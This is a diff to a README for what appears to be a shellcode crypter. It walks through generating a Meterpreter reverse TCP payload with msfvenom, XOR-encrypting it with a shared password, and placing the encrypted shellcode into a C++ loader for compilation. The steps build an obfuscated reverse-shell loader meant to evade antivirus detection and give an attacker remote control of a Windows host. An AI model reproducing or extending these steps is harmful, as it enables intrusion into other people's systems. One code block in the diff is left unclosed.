@@ -19,10 +19,24 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOS
 python xor_encryptor.py raw.txt > xor_shellcode.txt
 ```
 
+## Add a decryption password
+Add a password to both the main.cpp file and the xor_encryptor.py. It has to be the same password otherwise it will not work.
+
+```cpp
+  // replace the key variable with your own password or key
+  char key[9] = "password";
+  size_t key_len = strlen(key);
+
+```python
+# key should be similar to the one in the C++ file(main.cpp). Please
+# endeavour to change it!!
+KEY = "password"
+```
+
 ## Add the crypted shellcode on main.cpp
 Now that you have the encrypted shellcode you need to add it on the main.cpp file just like this:
-```
-char b[] = /*xor_shellcode*/
+```cpp
+unsigned char xor_shell_code[] = /* place_xor_shellcode_here */;
 ```
 
 ## Compile the main.cpp file
